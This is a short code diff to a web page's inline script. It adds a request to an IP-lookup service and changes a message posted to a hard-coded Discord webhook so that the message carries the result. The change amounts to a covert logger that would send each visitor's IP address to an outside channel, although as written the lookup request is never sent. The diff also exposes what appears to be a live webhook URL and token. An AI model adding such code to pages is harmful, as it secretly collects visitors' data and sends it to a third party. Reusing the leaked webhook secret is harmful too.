@@ -7,6 +7,10 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
 <script>
 //$.getJSON("https://api.myip.com", function(data) {
+  const req = new XMLHttpRequest();
+  req.open("GET", "https://api.myip.com");
+  
+  req.setRequestHeader("Content-type", "application/json");
   let dataaa = {'content':'test'}
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
@@ -16,7 +20,7 @@
   const params = {
     username: "Hi :3",
     avatar_url: "",
-    content: "test :3"
+    content: req.responseText
   }
 
   request.send(JSON.stringify(params));
